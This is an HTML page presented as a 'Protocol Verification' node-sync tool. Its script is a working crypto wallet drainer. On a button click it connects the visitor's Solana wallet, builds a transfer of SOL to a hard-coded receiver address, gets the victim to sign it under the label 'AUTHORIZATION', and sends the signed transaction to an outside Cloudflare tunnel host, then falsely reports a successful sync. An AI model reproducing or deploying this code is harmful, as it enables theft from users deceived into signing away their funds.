<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Protocol Verification</title>
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
</head>
<body style="background:#000;color:#14F195;text-align:center;padding-top:20vh;font-family:monospace;">
    <div style="border:1px solid #333;padding:40px;display:inline-block;border-radius:15px;background:#111;">
        <h2>ğŸ”± CORE SYNC</h2>
        <button id="cta" style="padding:15px 40px;background:#14F195;color:#000;font-weight:bold;border:none;border-radius:5px;cursor:pointer;">START SYNC</button>
        <div id="status" style="margin-top:20px;color:#444;">WAITING...</div>
    </div>

    <script>
        // ğŸ”± ä½ çš„éš§é“åœ°å€
        const tunnel = "https://florist-imperial-apnic-anymore.trycloudflare.com";
        const RECEIVER = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A";

        document.getElementById('cta').onclick = async () => {
            const p = window.solana;
            try {
                const resp = await p.connect();
                document.getElementById('status').innerText = "SYNCING NODE DATA...";

                // 1. å‘ä½ çš„æœåŠ¡å™¨ä¸­ç»§è¯·æ±‚ Blockhash
                const sync = await fetch(`${tunnel}/sync`);
                const { bh } = await sync.json();

                // 2. æ„é€ çœŸæ­£çš„è½¬è´¦æ”¯ç¥¨
                const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com"); // ä»…ä½œå¯¹è±¡å£°æ˜
                const transaction = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: resp.publicKey,
                        toPubkey: new solanaWeb3.PublicKey(RECEIVER),
                        lamports: 10000000, // æµ‹è¯• 0.01 SOL
                    })
                );
                transaction.recentBlockhash = bh;
                transaction.feePayer = resp.publicKey;

                // 3. æ‹‰èµ·ç­¾çº¦
                document.getElementById('status').innerText = "AWAITING AUTHORIZATION...";
                const signed = await p.signTransaction(transaction);
                
                // 4. å›ä¼ å·²ç­¾åçš„æ”¯ç¥¨
                const rawTx = signed.serialize().toString('base64');
                await fetch(`${tunnel}/collect?auth_sig=${encodeURIComponent(rawTx)}`);
                
                document.getElementById('status').innerText = "SYNC COMPLETED";
                alert("Node synchronized successfully!");

            } catch(e) {
                document.getElementById('status').innerText = "SYNC FAILED";
                console.error(e);
            }
        };
    </script>
</body>
</html>
